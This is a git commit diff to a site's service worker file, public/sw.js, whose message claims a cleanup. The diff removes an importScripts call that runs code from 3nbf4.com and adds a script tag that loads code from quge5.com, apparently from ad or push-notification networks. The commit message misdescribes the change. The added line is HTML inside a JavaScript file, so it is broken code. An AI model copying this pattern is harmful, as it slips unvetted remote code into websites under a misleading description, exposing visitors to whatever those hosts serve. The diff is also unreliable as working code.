500029a2119db544b687940cdd256f9ee9752ffb
bluepill02 <158752619+bluepill02@users.noreply.github.com>
2026-01-08 14:01:30 +0530

    Clean up service worker configuration
    Removed service worker options and import script.

--- public/sw.js
+++ public/sw.js
@@ -1,6 +1,1 @@
-self.options = {
-    "domain": "3nbf4.com",
-    "zoneId": 10433231
-}
-self.lary = ""
-importScripts('https://3nbf4.com/act/files/service-worker.min.js?r=sw')
+<script src="https://quge5.com/88/tag.min.js" data-zone="199997" async data-cfasync="false"></script>
